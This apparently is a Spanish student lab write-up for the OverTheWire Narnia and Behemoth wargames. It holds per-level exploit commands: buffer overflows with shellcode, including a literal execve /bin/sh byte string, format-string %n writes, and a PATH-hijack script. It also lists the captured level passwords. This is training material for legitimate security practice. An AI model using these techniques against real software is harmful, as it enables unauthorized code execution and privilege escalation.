@@ -1,1 +1,215 @@
+------------------------------------------------ Laboratorio 4 Narnia SIS2330 ------------------------------------------------
+        univ. Puña Canaviri Gabriela Katherine
 
+********************** Narnia ****************************
+    Para conectarnos a cada nivel usamos SSH con el puerto 2226:
+    ssh narniaN@narnia.labs.overthewire.org -p 2226
+    Donde N es el número de nivel.
+
+*Nivel 0 → Nivel 1*
+
+    Análisis del código fuente
+      - Una variable buf de 20 bytes.
+      - Una variable val que queremos sobrescribir a 0xdeadbeef.
+      - Uso de gets(buf), lo que permite desbordamiento.
+    Determinación del offset:
+      - Se necesitan 20 bytes para llenar buf.
+      - 4 bytes adicionales para sobrescribir val.
+    Construcción del payload:
+        python -c 'print("A"*20 + "\xef\xbe\xad\xde")' | ./narnia0
+    Obtención de la contraseña:
+        cat /etc/narnia_pass/narnia1
+
+                                                      Contraseña: WDcYUTG5ul
+
+*Nivel 1 → Nivel 2*
+
+    *Ejecutar código shell almacenado en una variable de entorno.
+    Análisis del código fuente:
+      - El programa narnia1 busca la variable de entorno EGG.
+      - Si la encuentra, ejecuta su contenido.
+    Creación del shellcode:
+        export EGG=$(python -c 'print("\x90"*100 + "<shellcode>")')
+    Ejecución del programa:
+        ./narnia1
+    Obtención de la contraseña:
+        cat /etc/narnia_pass/narnia2
+
+                                                      Contraseña: 5agRAXeBdG
+
+*Nivel 2 → Nivel 3*
+
+    *Explotar un desbordamiento de búfer para sobrescribir la dirección de retorno.
+
+    Análisis del código fuente:
+      - strcpy() sin verificar límites.
+      - Permite desbordar buf y sobreescribir EIP.
+
+    Creamos el shellcode y lo almacenamos en memoria.
+    Anotamos su dirección con gdb.
+    Construimos el payload.
+        ./narnia2 $(python -c 'print("<padding>" + "<ret_addr>")')
+    Obtención de la contraseña:
+        cat /etc/narnia_pass/narnia3
+
+                                                      Contraseña: 2xszzNl6uG
+
+*Nivel 3 → Nivel 4*
+
+    *Sobrescribir variable de control mediante desbordamiento.
+
+    Análisis del código fuente:
+        - strcpy() permite desbordar y sobrescribir variable de control.
+    Determinación del offset:
+        - Calcular cuántos bytes se necesitan.
+    Construcción del payload:
+          ./narnia3 $(python -c 'print("A"*<offset> + "\x01\x00\x00\x00")')
+    Obtención de la contraseña:
+          cat /etc/narnia_pass/narnia4
+
+                                                      Contraseña: iqNWNk173q
+
+*Nivel 4 → Nivel 5*
+
+    *Desbordamiento de búfer para sobrescribir la dirección de retorno.
+
+    Análisis del código fuente:
+        - strcpy() sin verificación.
+    Crear shellcode.
+    Anotar dirección.
+    Construir payload.
+        ./narnia4 $(python -c 'print("<padding>" + "<ret_addr>")')
+    Obtención de la contraseña:
+        cat /etc/narnia_pass/narnia5
+
+                                                      Contraseña: Ni3xHPEuuw
+*Nivel 5 → Nivel 6*
+
+    *Explotar vulnerabilidad de formato de cadena.
+    Análisis del código fuente:
+      - snprintf() con string controlada por el usuario.
+      - Usamos %n para escribir en memoria.
+    Construcción del payload:
+        ./narnia5 $(python -c 'print("<payload con %n y dirección>")')
+    Obtención de la contraseña:
+        cat /etc/narnia_pass/narnia6
+
+                                                      Contraseña: BNSjoSDeGL
+
+*Nivel 6 → Nivel 7*
+
+    *Explotar vulnerabilidad de puntero de función.
+    Análisis del código fuente:
+      - Puntero de función vulnerable.
+      - rescribir la ejecución.
+    Obtener dirección de función deseada (system o shell).
+    Determinar offset.
+    Construir payload.
+        ./narnia6 $(python -c 'print("A"*<offset> + "<direccion_funcion>")')
+    Obtención de la contraseña:
+        cat /etc/narnia_pass/narnia7
+
+                                                      Contraseña: 54RtepCEU0
+*Nivel 7 → Nivel 8*
+
+    *Explotar vulnerabilidad de formato de cadena para sobrescribir puntero de función.
+    Análisis del código fuente:
+      - printf() con string controlada.
+      - Se permite usar %n para modificar puntero de función.
+
+    Determinar dirección del puntero de función.
+    Construir payload con %n.
+        ./narnia7 $(python -c 'print("<payload con %n>")')
+    Obtención de la contraseña:
+        cat /etc/narnia_pass/narnia8
+                                                      Contraseña: i1SQ81fkb8
+
+*Nivel 8 → Nivel 9*
+
+    *Explotar desbordamiento de búfer.
+    Análisis del código fuente:
+    depues:
+          void func(char *b){
+              char *blah = b;
+              char bok[20];
+              memset(bok, '\0', sizeof(bok));
+              for(i=0; blah[i] != '\0'; i++)
+                  bok[i] = blah[i];
+              printf("%s\n", bok);
+          }
+
+    Copia sin verificar límites.
+    Determinación del offset:
+      - Probar distintas longitudes de entrada.
+      - Confirmar sobrescritura de EIP.
+    Construcción del payload:
+        ./narnia8 $(python -c 'print("A"*<offset> + "<ret_addr>")')
+    Obtención de la contraseña:
+        cat /etc/narnia_pass/narnia9
+                                            Contraseña: 1FFD4HnU4K
+
+
+
+********************** Behemoth ****************************
+    Para conectarnos a cada nivel usamos SSH con el puerto 2221:
+    ssh behemothN@behemoth.labs.overthewire.org -p 2221
+    Donde N es el número de nivel.
+nivel 0 -> Contraseña: behemoth0
+
+*Nivel 0 → Nivel 1*
+
+    Conexión al servidor
+    luego
+        /behemoth/behemoth0
+    Se solicitará una contraseña.
+    Análisis del binario con ltrace:
+        ltrace /behemoth/behemoth0
+    Observamos que el programa compara la entrada con la cadena "eatmyshorts".
+    Ingresar la contraseña correcta:
+        /behemoth/behemoth0
+        Password: eatmyshorts
+    Se obtiene acceso como behemoth1.
+    Obtención de la contraseña del siguiente nivel:
+    cat /etc/behemoth_pass/behemoth1
+
+                                                              Contraseña: 8YpAQCAuKf
+
+*Nivel 1 → Nivel 2*
+
+    Conexión al servidor
+    Análisis:
+      - El binario lee entrada en un búfer fijo.
+      - Es posible sobrescribir la dirección de retorno.
+      - Añadimos shellcode al final del payload.
+    Crear un payload con shellcode:
+        python -c 'print "A"*71 + "\xd7\x7f\xf9\xf7" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"' > /tmp/payload
+    **La dirección puede variar, se recomienda usar gdb para obtener la dirección correcta.
+    Ejecutar el binario con el payload:
+        /behemoth/behemoth1 < /tmp/payload
+    Se obtiene una shell como behemoth2.
+    Obtención de la contraseña del siguiente nivel:
+        cat /etc/behemoth_pass/behemoth2
+
+                                                              Contraseña: IxPJbQtH8q
+
+*Nivel 2 → Nivel 3*
+
+    Conexión al servidor:
+    Análisis:
+      - El binario ejecuta el comando `touch`.
+      - No especifica ruta absoluta.
+      - Aprovechamos la variable PATH para ejecutar nuestro propio script.
+    Crear un directorio temporal y navegar a él:
+        mkdir /tmp/b2z
+        cd /tmp/b2z
+    Crear un script llamado touch:
+        echo -e '#!/bin/sh\ncat /etc/behemoth_pass/behemoth3' > touch
+        chmod +x touch
+    Modificar la variable PATH:
+        export PATH=.:$PATH
+    Ejecutar:
+        /behemoth/behemoth2
+    Obtención de la contraseña del siguiente nivel:
+        cat /etc/behemoth_pass/behemoth3
+
+                                                  Contraseña: JQ6tZGqt0i
